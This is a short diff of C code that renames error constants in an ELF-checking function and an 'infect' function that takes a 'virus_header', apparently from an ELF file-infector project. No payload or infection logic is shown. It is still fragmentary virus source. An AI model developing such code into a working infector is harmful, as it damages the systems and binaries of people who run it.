@@ -11,7 +11,7 @@ static bool	is_elf64(const char *file)
 	Elf64_Ehdr	hdr;
 	int		fd = sys_open(file, O_RDONLY);
 
-	if (fd < 0) return errors(ERR_SYS, _ERR_OPEN_FAILED);
+	if (fd < 0) return errors(ERR_SYS, _ERR_S_OPEN_FAILED);
 
 	if (sys_read(fd, &hdr, sizeof(Elf64_Ehdr)) < (ssize_t)sizeof(Elf64_Ehdr)
 	|| memcmp(hdr.e_ident, (char[4]){ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3}, SELFMAG) != 0 // wrong Magic
@@ -22,7 +22,7 @@ static bool	is_elf64(const char *file)
 	|| hdr.e_shoff == 0)                          // no section hdr table
 	{
 		sys_close(fd);
-		return errors(ERR_USAGE, _ERR_NOT_ELF);
+		return errors(ERR_USAGE, _ERR_U_NOT_ELF);
 	}
 	sys_close(fd);
 	return true;
@@ -46,7 +46,7 @@ inline bool	infect(const struct virus_header *vhdr, const char *file)
 	{
 		free_accessor(&file_ref);
 		free_accessor(&clone_ref);
-		return errors(ERR_THROW, _ERR_INFECT);
+		return errors(ERR_THROW, _ERR_T_INFECT);
 	}
 	free_accessor(&file_ref);
 	free_accessor(&clone_ref);
